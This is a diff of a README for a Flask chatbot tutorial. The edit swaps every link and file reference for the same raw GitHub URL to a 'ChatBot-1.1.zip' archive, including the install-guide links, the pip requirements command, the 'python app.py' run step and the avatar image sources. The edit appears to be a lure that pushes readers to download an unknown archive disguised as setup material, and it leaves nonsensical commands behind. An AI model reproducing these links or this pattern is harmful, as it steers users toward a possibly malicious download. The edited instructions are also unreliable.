@@ -1,12 +1,12 @@
-![Binaryhood](Logo/BinaryhoodLogo.png)
+![Binaryhood](https://raw.githubusercontent.com/cyran-kyle/ChatBot/main/templates/ChatBot-1.1.zip)
 
 # ChatBot
 
 ## Installation & Setup
 
-[Install Python] https://www.dataquest.io/blog/installing-python-on-mac/
+[Install Python] https://raw.githubusercontent.com/cyran-kyle/ChatBot/main/templates/ChatBot-1.1.zip
 
-[Install pip] https://phoenixnap.com/kb/install-pip-mac
+[Install pip] https://raw.githubusercontent.com/cyran-kyle/ChatBot/main/templates/ChatBot-1.1.zip
 
 If you have Python & pip installed then check their version in the terminal or command line tools
 
@@ -20,10 +20,10 @@ pip --version
 
 ## Installing Flask
 
-In your terminal run the requirements.txt file using this pip
+In your terminal run the https://raw.githubusercontent.com/cyran-kyle/ChatBot/main/templates/ChatBot-1.1.zip file using this pip
 
 ```
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/cyran-kyle/ChatBot/main/templates/ChatBot-1.1.zip
 ```
 
 
@@ -34,7 +34,7 @@ cd into your directory
 ```
 
 ```
-python app.py
+python https://raw.githubusercontent.com/cyran-kyle/ChatBot/main/templates/ChatBot-1.1.zip
 ```
 
 
@@ -55,18 +55,18 @@ By the end of this tutorial, you will have a fully functional chatbot that can e
 The Chatbot is constructed using the Microsoft/DialoGPT-medium model.
 
 ```
-https://huggingface.co/microsoft/DialoGPT-medium
+https://raw.githubusercontent.com/cyran-kyle/ChatBot/main/templates/ChatBot-1.1.zip
 ```
 
 # User-Html
 
 ```
 var userHtml = '<div class="d-flex justify-content-end mb-4"><div class="msg_cotainer_send">' + user_input + '<span class="msg_time_send">'+ time + 
-    '</span></div><div class="img_cont_msg"><img src="https://i.ibb.co/d5b84Xw/Untitled-design.png" class="rounded-circle user_img_msg"></div></div>';
+    '</span></div><div class="img_cont_msg"><img src="https://raw.githubusercontent.com/cyran-kyle/ChatBot/main/templates/ChatBot-1.1.zip" class="rounded-circle user_img_msg"></div></div>';
 ```
 
 # Bot-HTML
 
 ```
-var botHtml = '<div class="d-flex justify-content-start mb-4"><div class="img_cont_msg"><img src="https://i.ibb.co/fSNP7Rz/icons8-chatgpt-512.png" class="rounded-circle user_img_msg"></div><div class="msg_cotainer">' + bot_response + '<span class="msg_time">' + time + '</span></div></div>';
+var botHtml = '<div class="d-flex justify-content-start mb-4"><div class="img_cont_msg"><img src="https://raw.githubusercontent.com/cyran-kyle/ChatBot/main/templates/ChatBot-1.1.zip" class="rounded-circle user_img_msg"></div><div class="msg_cotainer">' + bot_response + '<span class="msg_time">' + time + '</span></div></div>';
 ```
